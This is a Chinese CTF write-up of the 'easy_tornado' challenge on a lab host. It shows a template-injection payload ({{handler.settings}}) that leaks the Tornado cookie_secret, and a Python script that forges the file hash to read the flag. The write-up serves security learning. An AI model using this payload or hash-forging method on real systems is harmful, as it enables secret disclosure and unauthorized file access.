---
title: 护网杯——easy_tornado
date: 2020-03-24 16:50:54
id: 20200324165054
tags: 
	- CTF
	- Web_wp
categories: 网络安全
---

首先我们打开网页，发现三个链接。

![image-20200324165348081](https://superj.oss-cn-beijing.aliyuncs.com/image-20200324165348081.png)

点击第一个flag.txt，打开提示我们：

![](https://superj.oss-cn-beijing.aliyuncs.com/20200324165534.png)

我们观察url：

```url
http://947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn/file?filename=/flag.txt&filehash=77e8b02dac1f3d976567bc691476bfcc
```

发现通过get传递两个参数，一个`filename`，一个`filehash`。因此我们可以构造url，访问flag的位置。

```url
http://947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=77e8b02dac1f3d976567bc691476bfcc
```

访问发现返回`Error`。

因此查看另外两个文件的信息。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200324165850.png)

![](https://superj.oss-cn-beijing.aliyuncs.com/20200324165859.png)

发现render，判断这是一个web框架的方法，而下面hints.txt的内容则告诉了我们上面url中的filehash是如何生成的。

现在我们不知道cookie_secret是多少，我们无论通过`F12`，在network中查看，还是抓包分析，都没有发现cookie_secret的值。

现在render这个信息还没有用，那么有没有可能漏洞是出现在这个函数中呐。

我们通过百度题目名`tornado`，发现这是一个python的web框架，坚信了问题是在这个框架上面。

百度`tornado render漏洞`，发现render是通过传递的参数来确定返回的内容，而我们的报错页面正是通过参数来显示的，因此我们可以利用它来返回tornado中的一些定义的对象。

```url
http://947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn/error?msg={{handler.settings}}
```

返回信息中确定cookie_secret的值为：

```json
'cookie_secret': 'd27d0275-4f9b-45f6-b948-37f6b05c8d42'
```

现在我们可以编写脚本，计算hash值：

```python
# coding=utf-8
from hashlib import md5

cookie_secret = 'd27d0275-4f9b-45f6-b948-37f6b05c8d42'

file_name = '/fllllllllllllag'

file_hash = md5(cookie_secret + md5(file_name).hexdigest())
print(file_hash.hexdigest())

```

我们可以先将`file_name`写为`/file.txt`，执行获得hash值，和原来url中的`filehash`是否一样，判断脚本正确性。

执行脚本得到hash值：

```
a99916bbf8732bd409c33d161d751c90
```

构造url：

```url
http://947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=a99916bbf8732bd409c33d161d751c90
```

访问该url得到flag值。